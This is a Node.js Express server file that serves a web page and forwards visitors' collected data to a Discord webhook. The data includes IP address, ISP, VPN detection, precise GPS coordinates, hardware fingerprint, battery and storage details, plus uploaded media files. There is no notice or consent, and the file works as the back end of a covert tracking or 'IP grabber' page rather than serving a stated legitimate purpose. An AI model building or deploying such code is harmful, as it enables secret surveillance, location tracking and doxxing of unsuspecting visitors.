// server.js
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Environment variables
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
if (!DISCORD_WEBHOOK) {
    console.error('Error: DISCORD_WEBHOOK environment variable not set');
    process.exit(1);
}

// Serve static files (your HTML)
app.use(express.static('public'));

// API endpoint to handle scan data
app.post('/api/scan', async (req, res) => {
    try {
        const scanData = req.body;
        
        // Send embed to Discord
        await sendToDiscord({
            embeds: [{
                title: "🔍 Complete System Scan Results",
                color: scanData.network?.isVPN === "⚠️ VPN/PROXY DETECTED" ? 0xff0000 : 0x3498db,
                fields: [
                    { name: "🖥️ Device Info", value: formatDeviceInfo(scanData), inline: false },
                    { name: "💻 Hardware Info", value: formatHardwareInfo(scanData), inline: false },
                    { name: "🌐 Network Info", value: formatNetworkInfo(scanData), inline: false },
                    { name: "🖥️ Display Info", value: formatDisplayInfo(scanData), inline: true },
                    { name: "🗺️ Geolocation", value: formatGeolocation(scanData), inline: true },
                    { name: "🌍 Locale Info", value: formatLocaleInfo(scanData), inline: false },
                    { name: "🔋 Battery Info", value: formatBatteryInfo(scanData), inline: true },
                    { name: "💾 Storage Info", value: formatStorageInfo(scanData), inline: true },
                    { name: "⚙️ Other Info", value: formatOtherInfo(scanData), inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error processing scan data:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API endpoint to handle media uploads
app.post('/api/upload', async (req, res) => {
    try {
        if (!req.body.file || !req.body.filename || !req.body.content) {
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }

        // Convert base64 to buffer
        const fileBuffer = Buffer.from(req.body.file, 'base64');
        
        // Create FormData
        const formData = new FormData();
        formData.append('file', fileBuffer, req.body.filename);
        formData.append('content', req.body.content);
        
        // Send to Discord
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`Discord API responded with ${response.status}`);
        }

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error uploading file:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Helper functions to format embed fields
function formatDeviceInfo(data) {
    return `**Type:** ${data.deviceType}\n**Model:** ${data.deviceModel}\n**OS:** ${data.os} ${data.osVersion}\n**Browser:** ${data.browser} ${data.browserVersion}\n**Platform:** ${data.platform}\n**User Agent:** \`\`\`${data.userAgent}\`\`\``;
}

function formatHardwareInfo(data) {
    return `**CPU:** ${data.cpu}\n**GPU:** ${data.gpu}\n**GPU Vendor:** ${data.gpuVendor}\n**RAM:** ${data.ram}\n**Device Memory:** ${data.deviceMemory}\n**Cores:** ${data.hardwareConcurrency}\n**Touch Points:** ${data.maxTouchPoints}`;
}

function formatNetworkInfo(data) {
    return `**IP:** ${data.ip}\n**Location:** ${data.location}\n**Region:** ${data.region}\n**ISP:** ${data.isp}\n**ASN:** ${data.network.asn}\n**VPN/Proxy:** ${data.network.isVPN}\n**Connection:** ${data.network.connectionType} (${data.network.effectiveType})\n**Downlink:** ${data.network.downlink}\n**RTT:** ${data.network.rtt}\n**Save Data:** ${data.network.saveData}`;
}

function formatDisplayInfo(data) {
    return `**Screen:** ${data.screen}\n**Color Depth:** ${data.colorDepth}\n**Pixel Ratio:** ${data.pixelRatio}`;
}

function formatGeolocation(data) {
    return `**Latitude:** ${data.geolocation.latitude}\n**Longitude:** ${data.geolocation.longitude}\n**Accuracy:** ${data.geolocation.accuracy}\n**Altitude:** ${data.geolocation.altitude}\n**Speed:** ${data.geolocation.speed}`;
}

function formatLocaleInfo(data) {
    return `**Timezone:** ${data.locale.timezone}\n**Locale:** ${data.locale.locale}\n**Languages:** ${data.locale.languages}\n**Date Format:** ${data.locale.dateFormat}\n**Time Format:** ${data.locale.timeFormat}\n**Calendar:** ${data.locale.calendar}\n**Numbering System:** ${data.locale.numberingSystem}`;
}

function formatBatteryInfo(data) {
    return `**Level:** ${data.battery.level}\n**Charging:** ${data.battery.charging}\n**Charging Time:** ${data.battery.chargingTime}\n**Discharging Time:** ${data.battery.dischargingTime}`;
}

function formatStorageInfo(data) {
    return `**Quota:** ${data.storage.quota}\n**Usage:** ${data.storage.usage}\n**Persisted:** ${data.storage.persisted}`;
}

function formatOtherInfo(data) {
    return `**Cookies Enabled:** ${data.cookieEnabled}\n**WebDriver:** ${data.webdriver}\n**Java Enabled:** ${data.javaEnabled}\n**Plugins:** ${data.plugins}\n**MIME Types:** ${data.mimeTypes}`;
}

async function sendToDiscord(payload) {
    const response = await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        throw new Error(`Discord API responded with ${response.status}`);
    }
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
